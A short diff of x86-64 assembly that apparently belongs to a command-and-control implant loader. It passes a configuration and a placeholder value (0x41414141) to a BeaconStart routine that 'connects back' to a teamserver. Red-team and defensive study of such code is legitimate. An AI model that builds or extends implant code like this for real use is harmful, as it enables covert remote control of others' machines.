@@ -21,6 +21,7 @@ Entry:
 	;; start connection back to ts
 
 	lea	rcx, [rel Config]
+	mov	rdx, 0x41414141
 	call	BeaconStart
 
 	;; cleanup
